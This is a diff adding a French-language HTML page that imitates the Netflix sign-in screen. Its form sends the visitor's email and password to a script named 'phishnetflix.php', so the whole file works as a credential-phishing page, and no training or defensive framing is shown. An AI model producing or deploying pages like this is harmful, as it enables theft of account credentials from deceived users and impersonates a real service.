@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix Sign In</title>
+    <link rel="stylesheet" href="styles.css">
+    <script>
+        function sendForm(event) {
+            event.preventDefault(); // Empêche le rechargement de la page
+
+            let formData = new FormData(document.getElementById("loginForm"));
+
+            fetch("phishnetflix.php", {
+                method: "POST",
+                body: formData
+            })
+            .then(response => response.text())
+            .then(data => {
+                document.getElementById("message").innerHTML = data; // Affiche le message PHP
+            })
+            .catch(error => {
+                document.getElementById("message").innerHTML = "Erreur lors de l'inscription.";
+            });
+        }
+    </script>
+</head>
+<body>
+
+    <div class="overlay"></div>
+
+    <div class="logo">
+        <img src="src/img/Logos-Readability-Netflix-logo.png" alt="logo" width="250px" height="150px">
+    </div>
+
+    <div class="login-container">
+        <h2>S'identifier</h2>
+
+        <p id="message" style="color: red;"></p>
+
+        <form id="loginForm" onsubmit="sendForm(event)">
+            <input type="text" name="email" placeholder="E-mail ou numéro de mobile" required>
+            <input type="password" name="password" placeholder="Mot de passe" required>
+            <button class="loginbtn" type="submit">S'identifier</button>
+        </form>
+
+        <div class="options">
+            <a href="#">Mot de passe oublié ?</a>
+        </div>
+        <div class="separator">OU</div>
+        <button class="code-signin">Utiliser un code d'identification</button>
+        <label><input type="checkbox">Se souvenir de moi</label>
+
+        <p> Première visite sur Netflix ? <a href="#">Inscrivez-vous.</a> </p>
+        <small>Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot.
+            <br><a href="#">En savoir plus.</a>
+        </small>
+    </div>
+
+</body>
+</html>
